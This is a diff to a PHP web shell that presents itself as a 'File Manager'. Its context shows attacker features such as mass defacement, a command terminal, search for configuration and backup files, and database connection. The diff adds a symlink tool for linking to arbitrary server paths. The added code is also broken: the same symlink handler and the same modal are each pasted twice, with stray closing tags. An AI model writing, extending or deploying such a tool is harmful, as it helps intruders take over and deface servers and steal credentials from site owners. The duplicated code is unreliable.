UhcfHqUZYkt8/P4x2/+Iw4degL/6pWvxMLCAtIsRb/fx/z8PJaWlnDrre/Bl7/yv7Bjxw6M8lw1Vip3aS16WYbBYIBev1fXX0u2HpFMUFwTwRtRYC+uc/2lgToW4SOhTOBs6lCohT8pdxZKCl7GoRVvTLvskoaluSeNrvWRJAmWFhdxySUvxete+1qcccYZ2NjYwLe+9S381ac/g5XlZczOzjaLr/NEdVJlsCdPnsRzzz8P/+b1r8eec86BLUs8/PDD+OtPfxpPPHEI8wsLyPN8cqY74adIQc2tCV+b5jutU0WUKhmgaJTVX3PuvgtZ9ZMToucEOEZjc+NhNKwlCSAxqSm0o0WpBm6QpilWllcwGg3RHwxQFgVGeY75LVuQZhmKoozoV5vfIk0zrK+vY319Hf1eD9ZajPIcs7OzGAwGKPKc8KRt2A74Vkv/vUhSNzSFTFpTJF7HCOMt6a/5FtdgyDyMXRm8ex2lWobzHNwYYgvRZhT6orUbk6RsCXTW8T9JqtpRDWiTxKDIS8gvbOkedtxb622dsRmToCwLlDUG1MNfpGIelZ+dUzcnmOEJxVDe1jweqg28y3zKT5txlhi4UGd0WkahlbKrz3HlSuM581of3h8KjeooysLrV9mBbRnb7inLsoT1MrZxSSAutwaGJznYOnFMxW+Ft0KbB+i7wBDnCe3YZlw2D+8CKv3M5mrcqvE/Bz/b5cyGZ8R5xN58Z2kKNx3oat7QsqsDbYdVPsdmsjod9R5NTV5JL3z9hDFuzbyQGBOZ4S/3uWkWskPSLwl3CVWwDL/CVNay8YwxkWnBM9k2A4oc2m1g0cMBgklCdNyryKatheU2KNGmO6uctwgMkD4qwBpW1+qiJl6ewJhec01x3Jy0UJOFaNyeHTNId570ChOmclEeM9kihuzasMk7tIXoOIe3YF28mzSntJH9/sbrF5knygJ1EtI/Fmks/6DBki5MeD9N5l6HgzIF40iPzBYfdO8z1TWIdD+6mJFR+8qHBEw7LPhEMjEsY416D4ZMug17CsDceATYRx5xQuM3cHU4HfuKzyDV6yO05MV3RJuybaS96yJJ9DY7XuIp5l201H8SPqQ+bOFFQN0lW5XWLiafizZkPu80l2v83UblqNrJRTPWif9sxpUePMG1DE6iqR1ccVpar4XJzXg5rTgzSbmjS5hAh3G8TTLeCJ2mHhXLXpXMuvnhHsVb7pzkiSS9yfwlRlvUQG9SzUNTMJvYe04VPzQvsdmFaztsaMdBVsvks8pYkX+R6NPgsYOhWd6ueTE+iMAYIxJV5LH6qfpIbNDRCuOZUTXeUdv5FpxsCE1iC9JWGtDGdzwaXmjCUX9vmugms+Nz0sNGghsNmLCakYhvPK37iQvNZbcI7z5qK1PEQizXvbAWVjtnPN35L8Js+lrPjgILbfg2RMlCiBSBvSC4JXOqyoRPE1LfLu1m/E98GxipzXm390OIKC6EMExj6ADoztZ7Lqqi58BQBPdiKXOMN6vJbxWVkfm8daGykI1DeSessYfbMsVL4ZUSd4shYgTNfQpaDhIuaWdp84D1E5mVdRcYAh1m4F/Np3ox/pQ25iWUw7Z4C9Fpk/pTm8cO7lmg81C5hcVoHlNFDV/DwQhsGjDsvkIDQtQqnjUGcLUajZHXnI6j4cLEjCaqTfbXxrsFc1m5M63b8cUSXzIpGZoWOqnulAyNlgm8dZA8ItM7lHP0EQRWmKfpF1lbSzaZJ76lT5tx2YAgs9fFMmbaQlAkLAY7lFuyVv5w2AQtR5sHkbxijBZVNqMRGEJk6oaU84aCIdIMLaCpea0IQNfKGg0vSjQwCn+NoZOKAYEYydi18xjOQwMEZqTdFhHSagtL+0s1GCEj9YC0pGRpESbFZwKNJvx3xX7SeSKrOoxvrK48t2Xs2rk2HdFxbC2CUAkG3vk/0btIGaD0uU25bUpqKTdQnKcqiitCmcPGxsf4NROO42NjslrluxH++TqUORIwb+B423SoeXiaEFT9kjEnVMnSd0KQ9rGUsAbcNaZjWEDyRF1AvKYYSdHutILhgnIL/T6pQWm8tIXnthJMSF/e2obRZJsy+gAQKYuTItLYZpKA+QDrILQTr48GEDejeCndZsqght0Fz6tHTFGKB7VSvy5MxPDgZsJVDFJI88ayU/efZvBW7s/Xx0ET02CsGD1SUpBSTg/nSMLGcIAUPttAo4vpbhNIuI0rNXa4REQB4+Ka0zklDKR468BGNPjAF1TapIZ1596IgnTIY733AWlYjkcIkgEbRMY4jOXxQgdyF8gFoszHQp2kQB6fJaWbOL3oDRqGCR/BcSYy1gqGL711Xv0uHTyzVhZWLD5LfGrJjqBSkU1pg7Z58JhqG4xVM0gFaQYwwTz+uxiOO0d3lcC0+FjDiDsOXHLMc1G86OSTEhTOt2OFAlPKgOR5GX2PP26ggog0dPG7alrElHVhicqVDRZ4Z9Kv4UvKrq1voM2wptwgYRs6D9uFVrLmthqQFT47ZqwgGKXJ3LdTevC8dXGVCBkK2CWe6QaiuFMDz4KcrmjYGCQ7x+cz3MhqXVPsQ0NW4EmJjDxD9lSueCT6kBCQOV0f/qQa8TMhOX64rYIpvNDq+jjMZSMTTYK1CDNBNyEr5VEm8AZsTLNQVqEb4V9zxtJjImnHRj/OYLgxK3i0MR7BWwQKiyRWHkSJgUyr0+cvqOL64Lr2bIdiLDpQqxhwr6JeI2RjuDBBH8MWhApldUcR4I+YUTlvIYTiAEPTvlQG8pdjLH7Zw13T834nRfikzRH1edf7+KbjN7FIoVClT7yqpxK6FoB8aU2KHmT+ui3xmFS9AwGJUW/IFkN8+gyXUgjDjVBG7OZlqxQDeF6cYRwvTNCsSQDwntwmnNPjmRqaFJaEBTHKAon6YSGQYjhe2eFvLGvuxOFGWBu9ZxgEEomJBUvi+GObvL/uN++xOzasWySnXOu3NR5HcbvNLwEU8Ef+iAJIb/WSfr7LSw+eYriB0WyKTy25E9qXeh7nTTSMKOmW8OPhKrZj1XIL0WfslSrUgL13BZExnGdJN96D2jS4Q9agPrKxq2WrJ70ewosixP/xu6XpAgU7N+RHPgyhDcVwaTYr0TXsO1GiZX08PEExDwSDIyHDU6hgDNyAna6dYXjvsLYh35S34J2K0A9vXkpb8LBcFx7/El90nGD0sNK1QkKXF0bpPf3BTuHgTAKi2hh+eGiZ9FXQe+SUSLoxSDYXxRUSWOW4zcuonSfi7W4Koh/D6PLF0jIuTx9Mt9zre78hkzyfjdMOit5C0tHAI857U27Q1tjKXz0shFjjGIgbZSGkORv5pAxMmkfIUNTHfwsA3mNHCC0eKGZKoPJ7GI/IDoWu5/0R0hNOjw2aymvYPnbQhHskSozREfXE+eaAiumehMokzDroTmMugK9VoCsSlwMGNcURAWn4kFx5AChdH2lnWKY0bvDWXwxL+1BDJTgK0vwM3KueP0DaIUZq1kVacGGT0YgSJCmQN4q4SdxXIxuZR9gqhujzOb6kIy2KS5etQERasEY4ZtmewqVMUTBakMXgGV/jrql+uJIcGUvO04RDkKlhRwC3hhmbo0nflUg3R8AvYYE/uMzzYAxcNwvOwp9mUPwln2IuwnED44OHcq7U4KWdIaWk2WnBjiLcNgITlxuktkT5AUOSCxVWVvRI/CvFDyRBaHhiBkuxhrdbuaehp+g5MhdVEX0WgrcgZJyrb9HM2QgL4XlLtgzNX0PWga2NiEKY3CJ2JGvLQ2XMHmQiHk//HyVIm7AbWm52AAAAAElFTkSuQmCC";
-
 // --- Fungsi Bantuan ---
 function getFileSize($bytes)
 {
@@ -372,6 +370,42 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             }
             break;
 
+        case 'createSymlink':
+            if (!empty($_POST['target']) && !empty($_POST['linkName'])) {
+                $target = realpath($_POST['target']);
+                $linkName = $path . '/' . basename($_POST['linkName']);
+                if ($target) {
+                    if (symlink($target, $linkName)) {
+                        $result = ['success' => true, 'message' => 'Symlink created successfully.'];
+                    } else {
+                        $result['message'] = 'Failed to create symlink. Check permissions or if target exists.';
+                    }
+                } else {
+                    $result['message'] = 'Target for symlink not found.';
+                }
+            } else {
+                $result['message'] = 'Invalid request for symlink.';
+            }
+            break;
+
+        case 'createSymlink':
+            if (!empty($_POST['target']) && !empty($_POST['linkName'])) {
+                $target = realpath($_POST['target']);
+                $linkName = $path . '/' . basename($_POST['linkName']);
+                if ($target) {
+                    if (symlink($target, $linkName)) {
+                        $result = ['success' => true, 'message' => 'Symlink created successfully.'];
+                    } else {
+                        $result['message'] = 'Failed to create symlink. Check permissions or if target exists.';
+                    }
+                } else {
+                    $result['message'] = 'Target for symlink not found.';
+                }
+            } else {
+                $result['message'] = 'Invalid request for symlink.';
+            }
+            break;
+
         case 'massDeface':
             if (!empty($_POST['targetDir']) && !empty($_POST['fileName']) && isset($_POST['content'])) {
                 $targetDir = realpath($_POST['targetDir']);
@@ -458,7 +492,7 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title><?php echo htmlspecialchars($nick); ?> - File Manager</title>
-    <link rel="icon" href="<?php echo $imageIco; ?>" />
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 384 512'><path d='M40.1 467.1l-11.2 9c-3.2 2.5-7.1 3.9-11.1 3.9C8 480 0 472 0 462.2L0 192C0 86 86 0 192 0S384 86 384 192l0 270.2c0 9.8-8 17.8-17.8 17.8c-4 0-7.9-1.4-11.1-3.9l-11.2-9c-13.4-10.7-32.8-9-44.1 3.9L269.3 506c-3.3 3.8-8.2 6-13.3 6s-9.9-2.2-13.3-6l-26.6-30.5c-12.7-14.6-35.4-14.6-48.2 0L141.3 506c-3.3 3.8-8.2 6-13.3 6s-9.9-2.2-13.3-6L84.2 471c-11.3-12.9-30.7-14.6-44.1-3.9zM160 192a32 32 0 1 0 -64 0 32 32 0 1 0 64 0zm96 32a32 32 0 1 0 0-64 32 32 0 1 0 0 64z'/></svg>" type="image/svg+xml">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <style>
@@ -542,6 +576,7 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
                         <button class="btn btn-sm btn-info" data-bs-toggle="modal" data-bs-target="#newFolderModal"><i class="fas fa-folder-plus me-1"></i>New Folder</button>
                         <button class="btn btn-danger" data-bs-toggle="modal" data-bs-target="#massToolsModal"><i class="fas fa-tools"></i> Mass Tools</button>
                         <button class="btn btn-sm btn-warning text-dark" data-bs-toggle="modal" data-bs-target="#commandModal"><i class="fas fa-terminal me-1"></i>Terminal</button>
+                        <button class="btn btn-sm btn-secondary" data-bs-toggle="modal" data-bs-target="#symlinkModal"><i class="fas fa-link me-1"></i>Symlink</button>
                         <button class="btn btn-secondary" data-bs-toggle="modal" data-bs-target="#serverInfoModal"><i class="fas fa-info-circle"></i> Server Info</button>
                     </div>
                     <div class="mt-3">
@@ -622,7 +657,7 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
     <!-- MODALS -->
     <!-- View File -->
     <div class="modal fade" id="viewFileModal" tabindex="-1">
-        <div class="modal-dialog modal-xl">
+        <div class="modal-dialog modal-xl modal-dialog-centered">
             <div class="modal-content">
                 <div class="modal-header">
                     <h5 class="modal-title"><i class="fas fa-eye me-2"></i>View File: <span id="viewFileName"></span></h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button>
@@ -636,7 +671,7 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
 
     <!-- Upload -->
     <div class="modal fade" id="uploadModal" tabindex="-1">
-        <div class="modal-dialog">
+        <div class="modal-dialog modal-dialog-centered">
             <div class="modal-content">
                 <div class="modal-header">
                     <h5 class="modal-title"><i class="fas fa-upload me-2"></i>Upload File</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button>
@@ -651,7 +686,7 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
 
     <!-- New File -->
     <div class="modal fade" id="newFileModal" tabindex="-1">
-        <div class="modal-dialog">
+        <div class="modal-dialog modal-dialog-centered">
             <div class="modal-content">
                 <div class="modal-header">
                     <h5 class="modal-title"><i class="fas fa-file-plus me-2"></i>New File</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button>
@@ -669,7 +704,7 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
 
     <!-- New Folder -->
     <div class="modal fade" id="newFolderModal" tabindex="-1">
-        <div class="modal-dialog">
+        <div class="modal-dialog modal-dialog-centered">
             <div class="modal-content">
                 <div class="modal-header">
                     <h5 class="modal-title"><i class="fas fa-folder-plus me-2"></i>New Folder</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button>
@@ -684,7 +719,7 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
 
     <!-- Edit File -->
     <div class="modal fade" id="editFileModal" tabindex="-1">
-        <div class="modal-dialog modal-xl">
+        <div class="modal-dialog modal-xl modal-dialog-centered">
             <div class="modal-content">
                 <div class="modal-header">
                     <h5 class="modal-title"><i class="fas fa-edit me-2"></i>Edit File: <span id="editFileName"></span></h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button>
@@ -699,7 +734,7 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
 
     <!-- Rename -->
     <div class="modal fade" id="renameModal" tabindex="-1">
-        <div class="modal-dialog">
+        <div class="modal-dialog modal-dialog-centered">
             <div class="modal-content">
                 <div class="modal-header">
                     <h5 class="modal-title"><i class="fas fa-i-cursor me-2"></i>Rename</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button>
@@ -714,7 +749,7 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
 
     <!-- Permissions -->
     <div class="modal fade" id="permsModal" tabindex="-1">
-        <div class="modal-dialog">
+        <div class="modal-dialog modal-dialog-centered">
             <div class="modal-content">
                 <div class="modal-header">
                     <h5 class="modal-title"><i class="fas fa-lock me-2"></i>Change Permissions</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button>
@@ -889,9 +924,49 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
             </div>
         </div>
 
+    <!-- Symlink Modal -->
+    <div class="modal fade" id="symlinkModal" tabindex="-1">
+        <div class="modal-dialog modal-dialog-centered">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title"><i class="fas fa-link me-2"></i>Create Symlink</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+                </div>
+                <form method="post">
+                    <div class="modal-body">
+                        <div class="mb-3"><label class="form-label">Target Path</label><input type="text" name="target" class="form-control" placeholder="e.g., /var/www/html/target_folder" required></div>
+                        <div class="mb-3"><label class="form-label">Symlink Name</label><input type="text" name="linkName" class="form-control" placeholder="e.g., my_symlink" required></div>
+                    </div>
+                    <div class="modal-footer"><input type="hidden" name="action" value="createSymlink"><button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button><button type="submit" class="btn btn-primary">Create Symlink</button></div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+        </div>
+            </div>
+        </div>
+
+    <!-- Symlink Modal -->
+    <div class="modal fade" id="symlinkModal" tabindex="-1">
+        <div class="modal-dialog modal-dialog-centered">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title"><i class="fas fa-link me-2"></i>Create Symlink</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+                </div>
+                <form method="post">
+                    <div class="modal-body">
+                        <div class="mb-3"><label class="form-label">Target Path</label><input type="text" name="target" class="form-control" placeholder="e.g., /var/www/html/target_folder" required></div>
+                        <div class="mb-3"><label class="form-label">Symlink Name</label><input type="text" name="linkName" class="form-control" placeholder="e.g., my_symlink" required></div>
+                    </div>
+                    <div class="modal-footer"><input type="hidden" name="action" value="createSymlink"><button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button><button type="submit" class="btn btn-primary">Create Symlink</button></div>
+                </form>
+            </div>
+        </div>
+    </div>
+
         <!-- Server Info Modal -->
-        <div class="modal fade" id="serverInfoModal" tabindex="-1" aria-hidden="true">
-            <div class="modal-dialog modal-lg">
+        <div class="modal fade" id="serverInfoModal" tabindex="-1">
+            <div class="modal-dialog modal-lg modal-dialog-centered">
                 <div class="modal-content">
                     <div class="modal-header">
                         <h5 class="modal-title"><i class="fas fa-info-circle"></i> Server Information</h5>
@@ -1065,6 +1140,12 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
                     modal.querySelector('#deleteItemName').textContent = button.getAttribute('data-name');
                 });
 
+                handleModalEvents('symlinkModal', (event) => {
+                    const modal = event.currentTarget;
+                    modal.querySelector('input[name="target"]').value = '';
+                    modal.querySelector('input[name="linkName"]').value = '';
+                });
+
                 // --- Terminal Interaktif ---
                 const commandForm = document.getElementById('commandForm');
                 if (commandForm) {
@@ -1162,7 +1243,10 @@ $disk_used_percent = $disk_total > 0 ? round(($disk_used / $disk_total) * 100) :
                 handleMassToolForms('findConfigsForm', 'findConfigsResult');
                 handleMassToolForms('findBackupsForm', 'findBackupsResult');
                 handleMassToolForms('dbConnectForm', 'dbConnectResult');
+
+                handleModalEvents('serverInfoModal', () => {});
             });
         </script>
 </body>
+
 </html>
